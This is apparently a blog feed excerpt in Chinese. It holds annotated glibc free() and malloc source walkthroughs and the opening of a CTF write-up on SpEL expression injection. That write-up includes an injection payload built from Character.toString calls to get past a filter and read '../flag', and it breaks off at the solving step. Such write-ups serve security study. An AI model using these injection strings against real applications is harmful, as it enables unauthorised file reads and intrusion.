   if (__builtin_expect (nextchunk-&gt;size &lt;= 2 * SIZE_SZ, 0)
|| __builtin_expect (nextsize &gt;= av-&gt;system_mem, 0))
     {
errstr = &quot;free(): invalid next size (normal)&quot;;
goto errout;
     }

   free_perturb (chunk2mem(p), size - 2 * SIZE_SZ);
</code></pre>
<p>进行合并</p>
<pre><code class="language-c">   /* consolidate backward */
   if (!prev_inuse(p)) {
     prevsize = p-&gt;prev_size;
     size += prevsize;
     p = chunk_at_offset(p, -((long) prevsize));
     unlink(av, p, bck, fwd);
   }

   if (nextchunk != av-&gt;top) {
     /* get and clear inuse bit */
     nextinuse = inuse_bit_at_offset(nextchunk, nextsize);

     /* consolidate forward */
     if (!nextinuse) {
unlink(av, nextchunk, bck, fwd);
size += nextsize;
     } else
clear_inuse_bit_at_offset(nextchunk, 0);

     /*
Place the chunk in unsorted chunk list. Chunks are
not placed into regular bins until after they have
been given one chance to be used in malloc.
     */

     bck = unsorted_chunks(av);
     fwd = bck-&gt;fd;
     if (__glibc_unlikely (fwd-&gt;bk != bck))
{
  errstr = &quot;free(): corrupted unsorted chunks&quot;;
  goto errout;
}
     p-&gt;fd = fwd;
     p-&gt;bk = bck;
     if (!in_smallbin_range(size))
{
  p-&gt;fd_nextsize = NULL;
  p-&gt;bk_nextsize = NULL;
}
     bck-&gt;fd = p;
     fwd-&gt;bk = p;

     set_head(p, size | PREV_INUSE);
     set_foot(p, size);

     check_free_chunk(av, p);
   }
</code></pre>
<ul>
<li>如果前面有个chunk是free的,合并这个chunk</li>
<li>如果下一个chunk是topchunk.直接并入</li>
<li>如果下个chunk不是topchunk并且不在使用,会进行合并,清空使用状态</li>
<li>如果下个chunk是topchunk,并且正在使用,会放入到unsorted bin当中</li>
</ul>
<h1 id="返还内存">返还内存</h1>
<pre><code class="language-c">    /*
      If freeing a large space, consolidate possibly-surrounding
      chunks. Then, if the total unused topmost memory exceeds trim
      threshold, ask malloc_trim to reduce top.

      Unless max_fast is 0, we don't know if there are fastbins
      bordering top, so we cannot tell for sure whether threshold
      has been reached unless fastbins are consolidated.  But we
      don't want to consolidate on each free.  As a compromise,
      consolidation is performed if FASTBIN_CONSOLIDATION_THRESHOLD
      is reached.
    */
//size大于FASTBIN_CONSOLIDATION_THRESHOLD 向系统返还内存
    if ((unsigned long)(size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) {
      if (have_fastchunks(av))
   malloc_consolidate(av);

      if (av == &amp;main_arena) {
#ifndef MORECORE_CANNOT_TRIM
   if ((unsigned long)(chunksize(av-&gt;top)) &gt;=
       (unsigned long)(mp_.trim_threshold))
     systrim(mp_.top_pad, av);
#endif
      } else {
   /* Always try heap_trim(), even if the top chunk is not
      large, because the corresponding heap might go away.  */
   heap_info *heap = heap_for_ptr(top(av));

   assert(heap-&gt;ar_ptr == av);
   heap_trim(heap, mp_.top_pad);
      }
    }

    if (! have_lock) {
      assert (locked);
      (void)mutex_unlock(&amp;av-&gt;mutex);
    }
  }
  /*
    If the chunk was allocated via mmap, release via munmap().
  */

  else {
      //释放mmap的chunk
    munmap_chunk (p);
  }
}
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[glibc下malloc实现原理]]></title>
        <id>https://ch0x01e.github.io/post/glibc-xia-malloc-shi-xian-yuan-li/</id>
        <link href="https://ch0x01e.github.io/post/glibc-xia-malloc-shi-xian-yuan-li/">
        </link>
        <updated>2022-12-16T12:10:38.000Z</updated>
        <content type="html"><![CDATA[<p>在分析源码之前得先去了解各种有关的数据类型，可以参照下面这个网址。</p>
<blockquote>
<p>https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/heap-structure</p>
</blockquote>
<p>一般情况下我们申请一个内存通常是使用malloc函数，但是看glibc的源码我们就可以知道，其实malloc函数只是对<code>__libc__malloc</code>函数的一个封装。但是在<code>__libc__malloc</code>函数中，主要是调用的<code>_int_malloc</code>函数，所以我们读源码的重点就是<code>_int_malloc</code>函数</p>
<h1 id="变量定义初始检查">变量定义&amp;初始检查</h1>
<pre><code class="language-c">static void *
_int_malloc (mstate av, size_t bytes)
{
  INTERNAL_SIZE_T nb;               /* normalized request size */
  unsigned int idx;                 /* associated bin index */
  mbinptr bin;                      /* associated bin */

  mchunkptr victim;                 /* inspected/selected chunk */
  INTERNAL_SIZE_T size;             /* its size */
  int victim_index;                 /* its bin index */

  mchunkptr remainder;              /* remainder from a split */
  unsigned long remainder_size;     /* its size */

  unsigned int block;               /* bit map traverser */
  unsigned int bit;                 /* bit map traverser */
  unsigned int map;                 /* current word of binmap */

  mchunkptr fwd;                    /* misc temp for linking */
  mchunkptr bck;                    /* misc temp for linking */

  const char *errstr = NULL;

  /*
     Convert request size to internal form by adding SIZE_SZ bytes
     overhead plus possibly more to obtain necessary alignment and/or
     to obtain a size of at least MINSIZE, the smallest allocatable
     size. Also, checked_request2size traps (returning 0) request sizes
     that are so large that they wrap around zero when padded and
     aligned.
   */

  checked_request2size (bytes, nb);

  /* There are no usable arenas.  Fall back to sysmalloc to get a chunk from
     mmap.  */
  //没有可用的arena，去系统调用获取一个来自mmap的chunk
  if (__glibc_unlikely (av == NULL))
    {
      void *p = sysmalloc (nb, av);
      if (p != NULL)
   alloc_perturb (p, bytes);
      return p;
    }
</code></pre>
<p>关于在该函数中所用到的定义都在最开始给出了，在前面主要关注几个变量，nb和victim，nb是需要申请的内存的大小，victim是指向满足需求的chunk的指针，最后会返回victim指向的chunk的fd字段的地址。在定义完成这些变量后，判断了一下是否有可用的线程arena，如果没有就通过系统调用去获取。</p>
<h1 id="从fastbins中获取chunk">从fastbins中获取chunk</h1>
<pre><code class="language-c">//如果申请的大小小于fastbin最大的大小
  if ((unsigned long) (nb) &lt;= (unsigned long) (get_max_fast ()))
    {
      //记录这个大小的fastbin的索引
      idx = fastbin_index (nb);
      //得到这个fastbin对应的头指针
      mfastbinptr *fb = &amp;fastbin (av, idx);
      mchunkptr pp = *fb;

      do
        {
          victim = pp;
          if (victim == NULL)
            break;
        }
      while ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim))
             != victim);
      //存在可以利用的chunk
      if (victim != 0)
        {
          //如果取到的chunk大小和fastbin的索引不一致
          if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0))
            {
              errstr = &quot;malloc(): memory corruption (fast)&quot;;
            errout:
              malloc_printerr (check_action, errstr, chunk2mem (victim), av);
              return NULL;
            }
          //debug情况下会调用
          check_remalloced_chunk (av, victim, nb);
          //chunk转化成mem的形式
          void *p = chunk2mem (victim);
          alloc_perturb (p, bytes);
          return p;
        }
    }
</code></pre>
<p>最外层的if判断需要申请的内存大小是否小于fastbin的最大大小，在if循环体中，获取了相应大小的fastbin的索引和这个fastbin对应的头指针，在do-while循环中有一个catomic_compare_and_exchange_val_acq宏，他的作用如下:</p>
<blockquote>
<p>对于catomic_compare_and_exchange_val_acq(mem, newval, oldval)</p>
<p>如果mem指向的内容和oldval相等，会把mem指向的内容改为newval，并且返回oldval</p>
<pre><code class="language-c">if(*mem == oldver){
 *mem = newval;
 return oldver;
}
</code></pre>
</blockquote>
<p>对于执行该函数前的各个变量的值，看下图</p>
<figure data-type="image" tabindex="1"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20221214194215287.png" alt="image-20221214194215287" loading="lazy"></figure>
<p>一般情况下来说，这个宏函数只执行一次，对于<code>catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim)</code>，此时fb和victim都指向的是chunk1，该宏函数就是把victim-&gt;fd给到了fb，并且返回了victim所以此时fb应该是指向的chunk2，所以执行后的各个变量如图</p>
<figure data-type="image" tabindex="2"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20221214194859416.png" alt="image-20221214194859416" loading="lazy"></figure>
<p>此时的chunk1已经脱离链表了，可以看出，fastbin是LIFO表了(Last In First Out)。</p>
<h1 id="从smallbins获取chunk">从smallbins获取chunk</h1>
<pre><code class="language-c">  if (in_smallbin_range (nb))
    {
      //获取smallbin中大小为内存块大小的索引
      idx = smallbin_index (nb);
      //获取对应smallbin中的chunk指针
      bin = bin_at (av, idx);
      //如果victim=bin 则说明bin为空
      //如果victim!=bin，则有两种情况
      //一种是victim为0，说明smallbin还没有初始化
      if ((victim = last (bin)) != bin)
        {
          if (victim == 0) /* initialization check */
              //还没有初始化，把fastbins中的chunk合并
            malloc_consolidate (av);
          else
            {
              //获取victim后的一个chunk
              bck = victim-&gt;bk;
              //这里防止chunk伪造
   if (__glibc_unlikely (bck-&gt;fd != victim))
                {
                  errstr = &quot;malloc(): smallbin double linked list corrupted&quot;;
                  goto errout;
                }
    //设置 victim 对应的 inuse 位
              set_inuse_bit_at_offset (victim, nb);
    //这里就完成了取出victim，从bin和bck中间取出
              bin-&gt;bk = bck;
              bck-&gt;fd = bin;
// 如果不是 main_arena，设置对应的标志
              if (av != &amp;main_arena)
                victim-&gt;size |= NON_MAIN_ARENA;
              check_malloced_chunk (av, victim, nb);
              void *p = chunk2mem (victim);
              alloc_perturb (p, bytes);
              return p;
            }
        }
    }
</code></pre>
<p>判断如果请求的内存大小在smallbins的范围中，获取smallbin中大小为请求的内存块大小的索引，然后获取了对应的smallbin中的chunk指针，并且通过<code>(victim = last (bin)) != bin</code>判断bin是否是空的。通过<code>bck-&gt;fd != victim</code>来验证chunk是否是伪造的。然后设置inuse位，从bin和bck中间取出victim，判断是否是主线程，设置了对应的值。这里的smallbin是FIFO表(First In First Out)</p>
<p>取出chunk1前</p>
<figure data-type="image" tabindex="3"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20221214202808926.png" alt="image-20221214202808926" loading="lazy"></figure>
<p>取出chunk1后</p>
<figure data-type="image" tabindex="4"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20221214203250782.png" alt="image-20221214203250782" loading="lazy"></figure>
<p>此时chunk1已经从bin中脱离出来了。</p>
<h1 id="从largebins中获取chunk">从largebins中获取chunk</h1>
<pre><code class="language-c">else
  {
    //获取下标
    idx = largebin_index (nb);
    //如果有fastbin的话，会处理fastbin
    if (have_fastchunks (av))
      malloc_consolidate (av);
  }
</code></pre>
<h1 id="从unsortedbin中获取chunk">从unsortedbin中获取chunk</h1>
<h2 id="获取对应chunk的size">获取对应chunk的size</h2>
<pre><code class="language-c">for (;; )
  {
    int iters = 0;
    //如果unsorted bin 不为空
    while ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))
      {
        //victim为最后一个chunk，
        //bck为倒数第二个chunk
        bck = victim-&gt;bk;
        //限定chunk的大小
        if (__builtin_expect (victim-&gt;size &lt;= 2 * SIZE_SZ, 0)
            || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, 0))
          malloc_printerr (check_action, &quot;malloc(): memory corruption&quot;,
                           chunk2mem (victim), av);
        //获取了chunk的size
        size = chunksize (victim);
</code></pre>
<h2 id="尝试分割last_remainder">尝试分割last_remainder</h2>
<pre><code class="language-c">          if (in_smallbin_range (nb) &amp;&amp;
              bck == unsorted_chunks (av) &amp;&amp;
              victim == av-&gt;last_remainder &amp;&amp;
              (unsigned long) (size) &gt; (unsigned long) (nb + MINSIZE))
            {
              /* split and reattach remainder */
              //重新计算remainder的大小
              remainder_size = size - nb;
              //获取新的remainder的位置
              remainder = chunk_at_offset (victim, nb);
              //更新unsorted bin的情况
              unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;
              //更新av中的last_remainder
              av-&gt;last_remainder = remainder;
              //更新remainder的指针
              remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);
              if (!in_smallbin_range (remainder_size))
                {
                  remainder-&gt;fd_nextsize = NULL;
                  remainder-&gt;bk_nextsize = NULL;
                }
//设置victim的头部
              set_head (victim, nb | PREV_INUSE |
                        (av != &amp;main_arena ? NON_MAIN_ARENA : 0));
              //设置remainder的头部
              set_head (remainder, remainder_size | PREV_INUSE);
              //设置remainder的foot
              set_foot (remainder, remainder_size);
//
              check_malloced_chunk (av, victim, nb);
              void *p = chunk2mem (victim);
              alloc_perturb (p, bytes);
              return p;
            }
</code></pre>
<p>开始判断了申请的内存大小是否在smallbin的范围内，并且要满足下面三个条件:</p>
<ul>
<li>unsorted bin中只有一个唯一的chunk</li>
<li>唯一的chunk是last_remainder</li>
<li>last_remainder的大小要大于申请的大小加上最小值</li>
</ul>
<p>然后就进行了一些分割last_remainder的操作以及创建一个新的chunk</p>
<h2 id="移除当前元素与直接返回">移除当前元素与直接返回</h2>
<pre><code>          unsorted_chunks (av)-&gt;bk = bck;
          bck-&gt;fd = unsorted_chunks (av);

          /* Take now instead of binning if exact fit */
//如果取出来的大小和想要的大小刚好合适，那就直接取出
          if (size == nb)
            {
              //设置inuse位
              set_inuse_bit_at_offset (victim, size);
              //如果av不是main_arena，设置victim-&gt;size
              if (av != &amp;main_arena)
                victim-&gt;size |= NON_MAIN_ARENA;
              check_malloced_chunk (av, victim, nb);
              void *p = chunk2mem (victim);
              alloc_perturb (p, bytes);
              return p;
            }
</code></pre>
<h2 id="将当前元素放入对应的bin中">将当前元素放入对应的bin中</h2>
<pre><code>          if (in_smallbin_range (size))
            {
              //获取对应chunk的下标  把取出来的 chunk 放到对应的 small bin 中。
              victim_index = smallbin_index (size);
              bck = bin_at (av, victim_index);
              fwd = bck-&gt;fd;
            }
          else
            {
              victim_index = largebin_index (size);
              bck = bin_at (av, victim_index);
              fwd = bck-&gt;fd;

              /* maintain large bins in sorted order */
              //bin不为空
              if (fwd != bck)
                {
                  /* Or with inuse bit to speed comparisons */
                  size |= PREV_INUSE;
                  /* if smaller than smallest, bypass loop below */
                  //如果
                  assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == 0);
                  //如果chunk的大小小于bck-&gt;bk的大小
                  if ((unsigned long) (size) &lt; (unsigned long) (bck-&gt;bk-&gt;size))
                    {
                      fwd = bck;
                      bck = bck-&gt;bk;

                      victim-&gt;fd_nextsize = fwd-&gt;fd;
                      victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;
                      fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;
                    }
                  else
                    {
                      assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == 0);
                      while ((unsigned long) size &lt; fwd-&gt;size)
                        {
                          fwd = fwd-&gt;fd_nextsize;
                          assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == 0);
                        }

                      if ((unsigned long) size == (unsigned long) fwd-&gt;size)
                        /* Always insert in the second position.  */
                        fwd = fwd-&gt;fd;
                      else
                        {
                          victim-&gt;fd_nextsize = fwd;
                          victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;
                          fwd-&gt;bk_nextsize = victim;
                          victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;
                        }
                      bck = fwd-&gt;bk;
                    }
                }
              else
                victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;
            }

          mark_bin (av, victim_index);
          victim-&gt;bk = bck;
          victim-&gt;fd = fwd;
          fwd-&gt;bk = victim;
          bck-&gt;fd = victim;

#define MAX_ITERS       10000
          if (++iters &gt;= MAX_ITERS)
            break;
        }
</code></pre>
<p>判断了size属于smallbin还是largebin的范围，然后执行对应的代码，比如chunk在smallbin支持的范围内时，会把victim放到smallbins当中</p>
<pre><code class="language-c">if (in_smallbin_range (size))
  {
    //获取对应chunk的下标  把取出来的 chunk 放到对应的 small bin 中。
    victim_index = smallbin_index (size);
    bck = bin_at (av, victim_index);
    fwd = bck-&gt;fd;
  }
</code></pre>
<p>执行完if中的语句后，执行如下语句，完成了把victim插入到smallbins的过程</p>
<pre><code class="language-c">mark_bin (av, victim_index);
victim-&gt;bk = bck;
victim-&gt;fd = fwd;
fwd-&gt;bk = victim;
bck-&gt;fd = victim;
</code></pre>
<p>执行的结果如下</p>
<figure data-type="image" tabindex="5"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20221216153541815.png" alt="image-20221216153541815" loading="lazy"></figure>
<p>对于largebins，情况又与smallbins不同，largebin中存储的chunk的size不相同，在一个区间里，所以就需要进行一些判断。</p>
<p>这里的话分为两种情况，一种是 victim的size小于当前bin中最小chunk的size，第二种是 victim的size不小于当前bin中最小chunk的size</p>
<blockquote>
<p>victim的size小于当前bin中最小chunk的size</p>
</blockquote>
<p>此时执行的代码如下</p>
<figure data-type="image" tabindex="6"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20221214220720735.png" alt="image-20221214220720735" loading="lazy"></figure>
<p>执行前的结果如下，让fwd指向bin，自己指向bin-&gt;bk</p>
<p>执行到<code>if (fwd != bck)</code>的时候，数据结构布局如下</p>
<figure data-type="image" tabindex="7"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20221214221747776.png" alt="image-20221214221747776" loading="lazy"></figure>
<p>执行后的结果如下</p>
<figure data-type="image" tabindex="8"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20221216155929304.png" alt="image-20221216155929304" loading="lazy"></figure>
<p>最后在执行</p>
<pre><code class="language-c">mark_bin (av, victim_index);
victim-&gt;bk = bck;
victim-&gt;fd = fwd;
fwd-&gt;bk = victim;
bck-&gt;fd = victim;
</code></pre>
<p>结果如下</p>
<figure data-type="image" tabindex="9"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20221216160807590.png" alt="image-20221216160807590" loading="lazy"></figure>
<blockquote>
<p>victim的size不小于当前bin中最小chunk的size</p>
</blockquote>
<pre><code class="language-c">else
  {
    assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == 0);
    while ((unsigned long) size &lt; fwd-&gt;size)
      {
        fwd = fwd-&gt;fd_nextsize;
        assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == 0);
      }

    if ((unsigned long) size == (unsigned long) fwd-&gt;size)
      /* Always insert in the second position.  */
      fwd = fwd-&gt;fd;
    else
      {
        victim-&gt;fd_nextsize = fwd;
        victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;
        fwd-&gt;bk_nextsize = victim;
        victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;
      }
    bck = fwd-&gt;bk;
  }
</code></pre>
<p>用fd_nextsieze遍历链表，遇到size相同的时候，会插入到第二个位置</p>
<figure data-type="image" tabindex="10"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20221216165056000.png" alt="image-20221216165056000" loading="lazy"></figure>
<p>在victim和chunk1的size相等的时候，会在chunk1的fd方向插入这个bin链表，并且不会处理victim的两个nextsize字段，当victim的size和chunk1不相等的时候会对nextsize进行处理</p>
<p>在else块中，会把victim插入到chunk1和chunk2之间。</p>
<figure data-type="image" tabindex="11"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20221216165638081.png" alt="image-20221216165638081" loading="lazy"></figure>
<h2 id="从largebin中获取chunk">从largebin中获取chunk</h2>
<pre><code class="language-c">   if (!in_smallbin_range (nb))
     {
       bin = bin_at (av, idx);

       /* skip scan if empty or largest chunk is too small */
       if ((victim = first (bin)) != bin &amp;&amp;
           (unsigned long) (victim-&gt;size) &gt;= (unsigned long) (nb))
         {
           victim = victim-&gt;bk_nextsize;
           while (((unsigned long) (size = chunksize (victim)) &lt;
                   (unsigned long) (nb)))
             victim = victim-&gt;bk_nextsize;

           /* Avoid removing the first entry for a size so that the skip
              list does not have to be rerouted.  */
           if (victim != last (bin) &amp;&amp; victim-&gt;size == victim-&gt;fd-&gt;size)
             victim = victim-&gt;fd;

           remainder_size = size - nb;
           unlink (av, victim, bck, fwd);

           /* Exhaust */
           if (remainder_size &lt; MINSIZE)
             {
               set_inuse_bit_at_offset (victim, size);
               if (av != &amp;main_arena)
                 victim-&gt;size |= NON_MAIN_ARENA;
             }
           /* Split */
           else
             {
               remainder = chunk_at_offset (victim, nb);
               /* We cannot assume the unsorted list is empty and therefore
                  have to perform a complete insert here.  */
               bck = unsorted_chunks (av);
               fwd = bck-&gt;fd;
if (__glibc_unlikely (fwd-&gt;bk != bck))
                 {
                   errstr = &quot;malloc(): corrupted unsorted chunks&quot;;
                   goto errout;
                 }
               remainder-&gt;bk = bck;
               remainder-&gt;fd = fwd;
               bck-&gt;fd = remainder;
               fwd-&gt;bk = remainder;
               if (!in_smallbin_range (remainder_size))
                 {
                   remainder-&gt;fd_nextsize = NULL;
                   remainder-&gt;bk_nextsize = NULL;
                 }
               set_head (victim, nb | PREV_INUSE |
                         (av != &amp;main_arena ? NON_MAIN_ARENA : 0));
               set_head (remainder, remainder_size | PREV_INUSE);
               set_foot (remainder, remainder_size);
             }
           check_malloced_chunk (av, victim, nb);
           void *p = chunk2mem (victim);
           alloc_perturb (p, bytes);
           return p;
         }
     }
</code></pre>
<p>第一个if确保他不在smallbin的范围内，第二个if确保victim的size大于要申请的空间大小，也就是确保bin中最大的chunk大于要申请的空间，如果不满足就之间跳过这个if了。然后一直遍历bin，从大的开始找找到小于需要申请空间的大小的victim。并且这个victim不能是最后一个。然后会重新计算remainder大小，调用unlink把victim从链中脱出来，并且对remainder的size进行比较，如果小于minsize，就不需要切割了。如果大于minsize，则需要切割，会先把他加入到unsortedbin中，为<code>victim_remainder</code>构造相应的chunk信息</p>
<h2 id="从更大的bin获取chunk">从更大的bin获取chunk</h2>
<pre><code class="language-c">    /*
       Search for a chunk by scanning bins, starting with next largest
       bin. This search is strictly by best-fit; i.e., the smallest
       (with ties going to approximately the least recently used) chunk
       that fits is selected.
       The bitmap avoids needing to check that most blocks are nonempty.
       The particular case of skipping all bins during warm-up phases
       when no chunks have been returned yet is faster than it might look.
     */

    ++idx;
    bin   = bin_at(av, idx);
    block = idx2block(idx);
    map   = av-&gt;binmap[ block ];
    bit   = idx2bit(idx);

    for (;;) {
        /* Skip rest of block if there are no more set bits in this block.
         */
        if (bit &gt; map || bit == 0) {
            do {
                if (++block &gt;= BINMAPSIZE) /* out of bins */
                    goto use_top;
            } while ((map = av-&gt;binmap[ block ]) == 0);

            bin = bin_at(av, (block &lt;&lt; BINMAPSHIFT));
            bit = 1;
        }

        /* Advance to bin with set bit. There must be one. */
        while ((bit &amp; map) == 0) {
            bin = next_bin(bin);
            bit &lt;&lt;= 1;
            assert(bit != 0);
        }

        /* Inspect the bin. It is likely to be non-empty */
        victim = last(bin);

        /*  If a false alarm (empty bin), clear the bit. */
        if (victim == bin) {
            av-&gt;binmap[ block ] = map &amp;= ~bit; /* Write through */
            bin                 = next_bin(bin);
            bit &lt;&lt;= 1;
        }

        else {
            size = chunksize(victim);

            /*  We know the first chunk in this bin is big enough to use. */
            assert((unsigned long) (size) &gt;= (unsigned long) (nb));

            remainder_size = size - nb;

            /* unlink */
            unlink(av, victim, bck, fwd);

            /* Exhaust */
            if (remainder_size &lt; MINSIZE) {
                set_inuse_bit_at_offset(victim, size);
                if (av != &amp;main_arena) set_non_main_arena(victim);
            }

            /* Split */
            else {
                remainder = chunk_at_offset(victim, nb);

                /* We cannot assume the unsorted list is empty and therefore
                   have to perform a complete insert here.  */
                bck = unsorted_chunks(av);
                fwd = bck-&gt;fd;
                if (__glibc_unlikely(fwd-&gt;bk != bck)) {
                    errstr = &quot;malloc(): corrupted unsorted chunks 2&quot;;
                    goto errout;
                }
                remainder-&gt;bk = bck;
                remainder-&gt;fd = fwd;
                bck-&gt;fd       = remainder;
                fwd-&gt;bk       = remainder;

                /* advertise as last remainder */
                if (in_smallbin_range(nb)) av-&gt;last_remainder = remainder;
                if (!in_smallbin_range(remainder_size)) {
                    remainder-&gt;fd_nextsize = NULL;
                    remainder-&gt;bk_nextsize = NULL;
                }
                set_head(victim,
                         nb | PREV_INUSE |
                             (av != &amp;main_arena ? NON_MAIN_ARENA : 0));
                set_head(remainder, remainder_size | PREV_INUSE);
                set_foot(remainder, remainder_size);
            }
            check_malloced_chunk(av, victim, nb);
            void *p = chunk2mem(victim);
            alloc_perturb(p, bytes);
            return p;
        }
    }
</code></pre>
<p>前面是通过idx获取了一个bin，这里的idx是前面没有成果取出chunk的那个bin的idx，可能是smallbins也可能是largebins</p>
<blockquote>
<p>第一个if语句在逻辑上的含义为：当前map数字中是否存在位阶比bit更高的二进制位不为0，如果不存在，也就是bit &gt; map成立，就说明当前map对应的一系列bins中不存在size比nb大的chunk</p>
<p>然后程序会判定更高的map中是否含有chunk，如果都没有的话，就去切割top chunk来获得返回的chunk。如果有，就获取这个map对应的一系列bin中序号最小的bin</p>
<p>然后程序会开始寻找这个map中第一个含有chunk的bin</p>
<p>总之，这个被找到的bin，其最后一个chunk会被分割，分割出来的部分返回给用户，剩余部分，如果还满足MINSIZE的话，就加入unsorted bin</p>
</blockquote>
<h2 id="从topchunk中获取chunk">从topchunk中获取chunk</h2>
<pre><code class="language-c">use_top:
  /*
     If large enough, split off the chunk bordering the end of memory
     (held in av-&gt;top). Note that this is in accord with the best-fit
     search rule.  In effect, av-&gt;top is treated as larger (and thus
     less well fitting) than any other available chunk since it can
     be extended to be as large as necessary (up to system
     limitations).

     We require that av-&gt;top always exists (i.e., has size &gt;=
     MINSIZE) after initialization, so if it would otherwise be
     exhausted by current request, it is replenished. (The main
     reason for ensuring it exists is that we may need MINSIZE space
     to put in fenceposts in sysmalloc.)
   */

  victim = av-&gt;top;
  size = chunksize (victim);

  if ((unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE))
    {
      remainder_size = size - nb;
      remainder = chunk_at_offset (victim, nb);
      av-&gt;top = remainder;
      set_head (victim, nb | PREV_INUSE |
                (av != &amp;main_arena ? NON_MAIN_ARENA : 0));
      set_head (remainder, remainder_size | PREV_INUSE);

      check_malloced_chunk (av, victim, nb);
      void *p = chunk2mem (victim);
      alloc_perturb (p, bytes);
      return p;
    }

  /* When we are using atomic ops to free fast chunks we can get
     here for all block sizes.  */
  else if (have_fastchunks (av))
    {
      malloc_consolidate (av);
      /* restore original bin index */
      if (in_smallbin_range (nb))
        idx = smallbin_index (nb);
      else
        idx = largebin_index (nb);
    }

  /*
     Otherwise, relay to handle system-dependent cases
   */
  else
    {
      void *p = sysmalloc (nb, av);
      if (p != NULL)
        alloc_perturb (p, bytes);
      return p;
    }
}
</code></pre>
<p>直接从topchunk中切割。</p>
<ul>
<li>检查大小</li>
<li>更新<code>malloc_state</code>中的top chunk的地址</li>
<li>为切割后的top chunk构造相关数据</li>
</ul>
<h1 id="参考">参考</h1>
<p>https://blog.csdn.net/weixin_44215692/article/details/123930658</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[从CTF题看SpEL表达式注入]]></title>
        <id>https://ch0x01e.github.io/post/cong-ctf-ti-kan-spel-biao-da-shi-zhu-ru/</id>
        <link href="https://ch0x01e.github.io/post/cong-ctf-ti-kan-spel-biao-da-shi-zhu-ru/">
        </link>
        <updated>2022-12-03T12:30:26.000Z</updated>
        <content type="html"><![CDATA[<h1 id="前置知识">前置知识</h1>
<p>JWT相关知识</p>
<p>SpEL表达式</p>
<h1 id="审计过程">审计过程</h1>
<p>拿到题高兴坏了，擅长的java审计，直接给了源码，但是到最后卡住了，思想不对，没做出来。。赛后复现了一遍</p>
<p>主要是三个路由，/，/login和/success，在login路由接收了个username，创建了一个auth的cookie，通过JwtUtils.getToken(username)获取auth的值</p>
<p>在/success路由处理了这个auth，分别把sub和jti对应的值分别赋值给了username，uuid，并且uuid不包含flag和/，然后调用SpelExpressionParser.parserExpression去执行SpEL表达式，这里的话他是调用了FileRead，但是由于他是通过拼接字符串的，所以存在SpEL表达式注入漏洞，只需要控制我们的uuid即可，也就是jwt中的jti的值</p>
<figure data-type="image" tabindex="1"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20221203200721490.png" alt="image-20221203200721490" loading="lazy"></figure>
<p>通过名字可以判断FileRead应该是读取文件功能，直接进入这个FileRead，FileRead有重载函数，一个是获取的参数得是True，并且是Boolean类型的，会读取/flag，一个是字符串类型的读取一个文件，思路马上有了，就是构造一个JWT，然后让他的sub值是我们想要读取的文件名字，但是这里过滤了flag和/。目录遍历读取Flag是无法实现。</p>
<figure data-type="image" tabindex="2"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20221203201346450.png" alt="image-20221203201346450" loading="lazy"></figure>
<p>我们最终的目的是要构造出来<code>T(com.ctf.lander.Utils.OtherUtils).FileRead('../flag')</code>，但是这里他会自己加个Base_dir,这里的Base_dir是个/tmp/，我们需要用../去返回到上面那级，所以需要构造的是../flag而不是/flag，这里我们可以通过T(java.lang.Character).toStirng(ASCII).concat()这样的方式去连接处一个../flag，所以大概的拼接的内容如下</p>
<pre><code>T(java.lang.Character).toString(46).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(102)).concat(T(java.lang.Character).toString(108)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(103))
</code></pre>
<p>这个SpEL表达式的结果就是../flag，然后需要闭合前后单引号,就变成了</p>
<pre><code>'+T(java.lang.Character).toString(46).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(102)).concat(T(java.lang.Character).toString(108)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(103))+'
</code></pre>
<h1 id="解题过程">解题过程</h1>
<p>远端环境关了，只能自己本地搭建了，把之前的/tmp/换成了D:\tmp,把flag放到了D盘下面，其他无改动</p>
<p>首先先访问/login随便post进去一个username，获取到auth。</p>
<figure data-type="image" tabindex="3"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20221203202356400.png" alt="image-20221203202356400" loading="lazy"></figure>
